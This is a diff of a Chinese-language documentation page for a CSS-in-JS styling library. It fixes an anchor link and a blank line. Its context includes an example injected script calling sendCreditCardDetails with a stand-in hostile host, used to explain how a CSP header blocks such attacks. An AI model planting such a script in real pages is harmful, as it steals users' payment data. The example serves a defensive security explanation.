@@ -192,7 +192,7 @@ export default App;
 
 ## Class names
 
-您可能已经注意到我们的样式解决方案生成的类名称**不确定性**，所以你不能依赖它们保持不变。 类名由 [生成，我们的类名生成器](/css-in-js/api/#creategenerateclassname--options----class-name-generator) 让我们以下面的样式为例：
+您可能已经注意到我们的样式解决方案生成的类名称**不确定性**，所以你不能依赖它们保持不变。 类名由 [生成，我们的类名生成器](/css-in-js/api/#creategenerateclassname-options-class-name-generator) 让我们以下面的样式为例：
 
 ```jsx
 const useStyles = makeStyles({
@@ -283,7 +283,7 @@ const Button = withStyles(styles, { name: 'button' })(ButtonBase);
     <script>
       sendCreditCardDetails('https://hostile.example');
     </script>
-    
+
 
 此漏洞允许攻击者执行任何操作。 但是，使用安全的CSP标头，浏览器将不会加载此脚本。
 
